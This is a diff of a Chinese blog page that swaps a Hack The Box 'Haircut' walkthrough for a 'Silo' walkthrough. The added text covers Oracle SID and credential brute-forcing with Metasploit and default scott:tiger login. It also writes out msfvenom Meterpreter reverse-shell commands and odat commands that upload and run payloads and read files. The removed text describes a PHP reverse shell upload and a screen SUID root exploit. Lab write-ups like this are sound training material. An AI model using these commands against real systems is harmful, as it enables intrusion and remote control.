@@ -79,36 +79,34 @@
 
 
 
-<meta name="description" content="user.txt查看靶机端口信息：  开放了80端口，访问web服务：  没有有效信息，进行子目录爆破：  找到uploads和exposed.php，访问exposed.php页面：  尝试改变输入为百度的域名，查看返回页面源码：  查看到了curl信息，猜测靶机通过curl命令来访问所输入的url 结合爆破出的uploads目录，有如下思路：通过curl上传php-shell文件，然后通过we">
+<meta name="description" content="扫描端口信息:  访问80web服务：  尝试子目录爆破，并没有有效信息。 回看靶机所开放的端口，由于端口蛮多的，在次不一一分析 这里观察到1521端口oracle数据库的TNS listener 对oracle的各种攻击和利用的内容并不是很熟悉，查阅资料，按如下流程进行尝试：  首先，利用metasploit爆破当前oracle数据库的sid：  随后，尝试爆破数据库的登录凭证 oracle数据">
 <meta name="keywords" content="htb walkthrough">
 <meta property="og:type" content="article">
-<meta property="og:title" content="htb-haircut-walkthrough">
-<meta property="og:url" content="http://yoursite.com/2019/04/21/htb-haircut-walkthrough/index.html">
+<meta property="og:title" content="htb-silo-walkthrough">
+<meta property="og:url" content="http://yoursite.com/2019/04/26/htb-silo-walkthrough/index.html">
 <meta property="og:site_name" content="Ha0Za1-Pages">
-<meta property="og:description" content="user.txt查看靶机端口信息：  开放了80端口，访问web服务：  没有有效信息，进行子目录爆破：  找到uploads和exposed.php，访问exposed.php页面：  尝试改变输入为百度的域名，查看返回页面源码：  查看到了curl信息，猜测靶机通过curl命令来访问所输入的url 结合爆破出的uploads目录，有如下思路：通过curl上传php-shell文件，然后通过we">
+<meta property="og:description" content="扫描端口信息:  访问80web服务：  尝试子目录爆破，并没有有效信息。 回看靶机所开放的端口，由于端口蛮多的，在次不一一分析 这里观察到1521端口oracle数据库的TNS listener 对oracle的各种攻击和利用的内容并不是很熟悉，查阅资料，按如下流程进行尝试：  首先，利用metasploit爆破当前oracle数据库的sid：  随后，尝试爆破数据库的登录凭证 oracle数据">
 <meta property="og:locale" content="zh-Hans">
-<meta property="og:image" content="http://yoursite.com/2019/04/21/htb-haircut-walkthrough/nmap.png">
-<meta property="og:image" content="http://yoursite.com/2019/04/21/htb-haircut-walkthrough/main_page.png">
-<meta property="og:image" content="http://yoursite.com/2019/04/21/htb-haircut-walkthrough/dirbuster.png">
-<meta property="og:image" content="http://yoursite.com/2019/04/21/htb-haircut-walkthrough/exposed_php.png">
-<meta property="og:image" content="http://yoursite.com/2019/04/21/htb-haircut-walkthrough/get_baidu.png">
-<meta property="og:image" content="http://yoursite.com/2019/04/21/htb-haircut-walkthrough/python_http.png">
-<meta property="og:image" content="http://yoursite.com/2019/04/21/htb-haircut-walkthrough/burpsuite_original.png">
-<meta property="og:image" content="http://yoursite.com/2019/04/21/htb-haircut-walkthrough/burpsuite_upload.png">
-<meta property="og:image" content="http://yoursite.com/2019/04/21/htb-haircut-walkthrough/get_nc_shell.png">
-<meta property="og:image" content="http://yoursite.com/2019/04/21/htb-haircut-walkthrough/user_txt.png">
-<meta property="og:image" content="http://yoursite.com/2019/04/21/htb-haircut-walkthrough/find_suid_root.png">
-<meta property="og:image" content="http://yoursite.com/2019/04/21/htb-haircut-walkthrough/searchsploit_screen.png">
-<meta property="og:image" content="http://yoursite.com/2019/04/21/htb-haircut-walkthrough/41154_sh.png">
-<meta property="og:image" content="http://yoursite.com/2019/04/21/htb-haircut-walkthrough/libhax_c_rootshell_c.png">
-<meta property="og:image" content="http://yoursite.com/2019/04/21/htb-haircut-walkthrough/gcc.png">
-<meta property="og:image" content="http://yoursite.com/2019/04/21/htb-haircut-walkthrough/wget_libhax_rootshell.png">
-<meta property="og:image" content="http://yoursite.com/2019/04/21/htb-haircut-walkthrough/exploit_root_txt.png">
-<meta property="og:updated_time" content="2019-04-20T17:31:45.696Z">
+<meta property="og:image" content="http://yoursite.com/2019/04/26/htb-silo-walkthrough/zenmap.png">
+<meta property="og:image" content="http://yoursite.com/2019/04/26/htb-silo-walkthrough/iis_default_page.png">
+<meta property="og:image" content="http://yoursite.com/2019/04/26/htb-silo-walkthrough/oracle_attack_methodology.png">
+<meta property="og:image" content="http://yoursite.com/2019/04/26/htb-silo-walkthrough/oracle_sid_brute_force.png">
+<meta property="og:image" content="http://yoursite.com/2019/04/26/htb-silo-walkthrough/default_db_users_list.png">
+<meta property="og:image" content="http://yoursite.com/2019/04/26/htb-silo-walkthrough/login_brute_force.png">
+<meta property="og:image" content="http://yoursite.com/2019/04/26/htb-silo-walkthrough/sqlplus_login_sysdba.png">
+<meta property="og:image" content="http://yoursite.com/2019/04/26/htb-silo-walkthrough/odat_create_payload.png">
+<meta property="og:image" content="http://yoursite.com/2019/04/26/htb-silo-walkthrough/msf_get_shell.png">
+<meta property="og:image" content="http://yoursite.com/2019/04/26/htb-silo-walkthrough/user_txt.png">
+<meta property="og:image" content="http://yoursite.com/2019/04/26/htb-silo-walkthrough/odat_get_root_txt.png">
+<meta property="og:image" content="http://yoursite.com/2019/04/26/htb-silo-walkthrough/msfvenom_create_adminshell.png">
+<meta property="og:image" content="http://yoursite.com/2019/04/26/htb-silo-walkthrough/odat_putfile_adminshell.png">
+<meta property="og:image" content="http://yoursite.com/2019/04/26/htb-silo-walkthrough/odat_exec_adminshell.png">
+<meta property="og:image" content="http://yoursite.com/2019/04/26/htb-silo-walkthrough/get_adminshell.png">
+<meta property="og:updated_time" content="2019-04-26T13:04:55.278Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="htb-haircut-walkthrough">
-<meta name="twitter:description" content="user.txt查看靶机端口信息：  开放了80端口，访问web服务：  没有有效信息，进行子目录爆破：  找到uploads和exposed.php，访问exposed.php页面：  尝试改变输入为百度的域名，查看返回页面源码：  查看到了curl信息，猜测靶机通过curl命令来访问所输入的url 结合爆破出的uploads目录，有如下思路：通过curl上传php-shell文件，然后通过we">
-<meta name="twitter:image" content="http://yoursite.com/2019/04/21/htb-haircut-walkthrough/nmap.png">
+<meta name="twitter:title" content="htb-silo-walkthrough">
+<meta name="twitter:description" content="扫描端口信息:  访问80web服务：  尝试子目录爆破，并没有有效信息。 回看靶机所开放的端口，由于端口蛮多的，在次不一一分析 这里观察到1521端口oracle数据库的TNS listener 对oracle的各种攻击和利用的内容并不是很熟悉，查阅资料，按如下流程进行尝试：  首先，利用metasploit爆破当前oracle数据库的sid：  随后，尝试爆破数据库的登录凭证 oracle数据">
+<meta name="twitter:image" content="http://yoursite.com/2019/04/26/htb-silo-walkthrough/zenmap.png">
 
 
 
@@ -138,13 +136,13 @@
 
 
 
-  <link rel="canonical" href="http://yoursite.com/2019/04/21/htb-haircut-walkthrough/">
+  <link rel="canonical" href="http://yoursite.com/2019/04/26/htb-silo-walkthrough/">
 
 
 
 
 
-  <title>htb-haircut-walkthrough | Ha0Za1-Pages</title>
+  <title>htb-silo-walkthrough | Ha0Za1-Pages</title>
   
 
 
@@ -261,7 +259,7 @@
   
   
   <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/04/21/htb-haircut-walkthrough/">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/04/26/htb-silo-walkthrough/">
 
     <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
       <meta itemprop="name" content="Ha0Za1">
@@ -278,7 +276,7 @@
 
         
         
-          <h1 class="post-title" itemprop="name headline">htb-haircut-walkthrough</h1>
+          <h1 class="post-title" itemprop="name headline">htb-silo-walkthrough</h1>
         
 
         <div class="post-meta">
@@ -290,8 +288,8 @@
               
                 <span class="post-meta-item-text">发表于</span>
               
-              <time title="创建于" itemprop="dateCreated datePublished" datetime="2019-04-21T01:27:09+08:00">
-                2019-04-21
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2019-04-26T21:02:55+08:00">
+                2019-04-26
               </time>
             
 
@@ -328,47 +326,51 @@
       
 
       
-        <h2 id="user-txt"><a href="#user-txt" class="headerlink" title="user.txt"></a>user.txt</h2><p>查看靶机端口信息：</p>
-<p><img src="nmap.png" alt="nmap"></p>
-<p>开放了80端口，访问web服务：</p>
-<p><img src="main_page.png" alt="main_page"></p>
-<p>没有有效信息，进行子目录爆破：</p>
-<p><img src="dirbuster.png" alt="dirbuster"></p>
-<p>找到<strong>uploads</strong>和<strong>exposed.php</strong>，访问<strong>exposed.php</strong>页面：</p>
-<p><img src="exposed_php.png" alt="exposed_page"></p>
-<p>尝试改变输入为百度的域名，查看返回页面源码：</p>
-<p><img src="get_baidu.png" alt="get_baidu"></p>
-<p>查看到了<strong>curl</strong>信息，猜测靶机通过curl命令来访问所输入的url</p>
-<p>结合爆破出的<strong>uploads</strong>目录，有如下思路：通过curl上传php-shell文件，然后通过web访问获取到回连shell</p>
-<p>本地准备好php-shell，并开启web服务：</p>
-<p><img src="python_http.png" alt="python_http"></p>
-<p>发现直接通过输入框的方式，没有取得预期效果</p>
-<p><strong>burpsuite</strong>抓包查看：</p>
-<p><img src="burpsuite_original.png" alt="burpsuite_original"></p>
-<p>发现<strong>formurl</strong>信息，猜测靶机端按如下格式执行<code>curl $formurl</code>。</p>
-<p>因此为实现文件上传的功能，修改如下</p>
-<p><img src="burpsuite_upload.png" alt="burpsuite_upload"></p>
-<p>web访问<strong>uploads/resh.php</strong>，本地成功获取shell：</p>
-<p><img src="get_nc_shell.png" alt="nc_shell"></p>
-<p>成功拿到<strong>user.txt</strong>文件：</p>
+        <p>扫描端口信息:</p>
+<p><img src="zenmap.png" alt="zenmap"></p>
+<p>访问80web服务：</p>
+<p><img src="iis_default_page.png" alt="iis_default_page"></p>
+<p>尝试子目录爆破，并没有有效信息。</p>
+<p>回看靶机所开放的端口，由于端口蛮多的，在次不一一分析</p>
+<p>这里观察到1521端口oracle数据库的TNS listener</p>
+<p>对oracle的各种攻击和利用的内容并不是很熟悉，查阅<a href="https://www.blackhat.com/presentations/bh-usa-09/GATES/BHUSA09-Gates-OracleMetasploit-SLIDES.pdf" target="_blank" rel="noopener">资料</a>，按如下流程进行尝试：</p>
+<p><img src="oracle_attack_methodology.png" alt="oracle_attack_metasploit"></p>
+<p>首先，利用<code>metasploit</code>爆破当前oracle数据库的sid：</p>
+<p><img src="oracle_sid_brute_force.png" alt="sid_brute_force"></p>
+<p>随后，尝试爆破数据库的登录凭证</p>
+<p>oracle数据库有一些默认的登录凭证：</p>
+<p><img src="default_db_users_list.png" alt="default_db_user_list"></p>
+<p>仍然利用<code>metasploit</code>中的<code>auxiliary/admin/oracle/oracle_login</code>模块进行登录爆破：</p>
+<p><img src="login_brute_force.png" alt="oracle_login_brute_force"></p>
+<p>获得用户和口令：<code>scott:tiger</code></p>
+<p>利用sqlplus尝试登录，发现该用户具有<strong>sysdba</strong>权限：</p>
+<p><img src="sqlplus_login_sysdba.png" alt="sqlplus_login"></p>
+<p>基于此，展开如下利用过程：</p>
+<p>这里要用到一款对oracle数据库的利用工具<a href="https://github.com/quentinhardy/odat" target="_blank" rel="noopener">odat,Oracle Database Attacking Tool</a></p>
+<p>先利用<code>msfvenom</code>生成payload</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/x64/meterpreter/reverse_https lhost=10.10.14.9 lport=9001 -f aspx &gt; Shell.aspx</span><br></pre></td></tr></table></figure>
+<p>然后，利用odat将payload上传到靶机：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./odat-libc2.5-x86_64 dbmsxslprocessor -s 10.10.10.82 -d XE -U scott -P tiger --putFile &quot;C:\inetpub\wwwroot\\&quot; shell.aspx shell.aspx --sysdba</span><br></pre></td></tr></table></figure>
+<p><img src="odat_create_payload.png" alt="odat_create_payload"></p>
+<p>然后本地开启监听</p>
+<p>curl访问上传到靶机的<strong>shell</strong>，<code>curl http://10.10.10.82/shell.aspx</code>，获得shell:</p>
+<p><img src="msf_get_shell.png" alt="shell"></p>
+<p>拿到<strong>user.txt</strong>：</p>
 <p><img src="user_txt.png" alt="user_txt"></p>
-<h2 id="root-txt"><a href="#root-txt" class="headerlink" title="root.txt"></a>root.txt</h2><p>下一步尝试提权</p>
-<p>查找设置了<strong>SUID</strong>，且具有root权限的文件：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find / -perm -4000 -user root -exec ls -ld &#123;&#125; \; 2&gt;/dev/null</span><br></pre></td></tr></table></figure>
-<p><img src="find_suid_root.png" alt="find_suid_root"></p>
-<p>尝试对<strong>screen</strong>程序进行利用</p>
-<p><code>searchsploit</code>结果如下：</p>
-<p><img src="searchsploit_screen.png" alt="searchsploit_screen"></p>
-<p>利用说明如下：</p>
-<p><img src="41154_sh.png" alt="41154_sh"></p>
-<p>建立2个c程序如下：</p>
-<p><img src="libhax_c_rootshell_c.png" alt="2_c"></p>
-<p>编译：</p>
-<p><img src="gcc.png" alt="gcc"></p>
-<p>靶机将<strong>libhax.so</strong>和<strong>rootshell</strong>拉取到tmp目录</p>
-<p><img src="wget_libhax_rootshell.png" alt="wget"></p>
-<p>然后按照exploit流程，实现提权操作，拿到<strong>root.txt</strong></p>
-<p><img src="exploit_root_txt.png" alt="exploit_root"></p>
+<p>对于<strong>root.txt</strong>，由于已知其路径为<code>c:\Users\Administrator\Desktop\root.txt</code>，仍然可借助<code>odat</code>工具读取靶机文件：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./odat-libc2.5-x86_64 externaltable -s 10.10.10.82 -d XE -U scott -P tiger --getFile c:/Users/Administrator/Desktop root.txt getkeytomylocal.txt --sysdba</span><br></pre></td></tr></table></figure>
+<p><img src="odat_get_root_txt.png" alt="odat_get_root_txt"></p>
+<p>对于<strong>root.txt</strong>，还有另一方法：</p>
+<p>利用msfvenom生成一个exe payload</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=XXX port=xxx -f exe &gt; adminshell.exe</span><br></pre></td></tr></table></figure>
+<p><img src="msfvenom_create_adminshell.png" alt="msfvenom_adminshell"></p>
+<p>利用<strong>odat</strong>将<strong>adminshell.exe</strong>上传至目标靶机的指定目录下：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./odat-libc2.5-x86_64 utlfile -s 10.10.10.82 -d XE -U scott -P tiger --test-module --putFile /Users/Administrator/Desktop adminshell.exe adminshell.exe --sysdba</span><br></pre></td></tr></table></figure>
+<p><img src="odat_putfile_adminshell.png" alt="odat_putfile_adminshell"></p>
+<p><strong>metasploit</strong>本地开启监听，利用<strong>odat</strong>执行靶机内的<strong>adminshell.exe</strong>，获得shell:</p>
+<p><img src="odat_exec_adminshell.png" alt="odat_exec_adminshell"></p>
+<p><img src="get_adminshell.png" alt="metasploit_get_adminshell"></p>
+<p>即可去指定目录获得<strong>root.txt</strong></p>
 
       
     </div>
@@ -399,8 +401,8 @@
         <div class="post-nav">
           <div class="post-nav-next post-nav-item">
             
-              <a href="/2019/04/19/htb-popcorn-walkthrough/" rel="next" title="htb-popcorn-walkthrough">
-                <i class="fa fa-chevron-left"></i> htb-popcorn-walkthrough
+              <a href="/2019/04/25/htb-bashed-walkthrough/" rel="next" title="htb-bashed-walkthrough">
+                <i class="fa fa-chevron-left"></i> htb-bashed-walkthrough
               </a>
             
           </div>
@@ -408,10 +410,6 @@
           <span class="post-nav-divider"></span>
 
           <div class="post-nav-prev post-nav-item">
-            
-              <a href="/2019/04/22/htb-cronos-walkthrough/" rel="prev" title="htb-cronos-walkthrough">
-                htb-cronos-walkthrough <i class="fa fa-chevron-right"></i>
-              </a>
             
           </div>
         </div>
@@ -463,17 +461,8 @@
       
 
       
-        <ul class="sidebar-nav motion-element">
-          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
-            文章目录
-          </li>
-          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
-            站点概览
-          </li>
-        </ul>
-      
 
-      <section class="site-overview-wrap sidebar-panel">
+      <section class="site-overview-wrap sidebar-panel sidebar-panel-active">
         <div class="site-overview">
           <div class="site-author motion-element" itemprop="author" itemscope="" itemtype="http://schema.org/Person">
             
@@ -536,22 +525,6 @@
         </div>
       </section>
 
-      
-      <!--noindex-->
-        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
-          <div class="post-toc">
-
-            
-              
-            
-
-            
-              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#user-txt"><span class="nav-number">1.</span> <span class="nav-text">user.txt</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#root-txt"><span class="nav-number">2.</span> <span class="nav-text">root.txt</span></a></li></ol></div>
-            
-
-          </div>
-        </section>
-      <!--/noindex-->
       
 
       
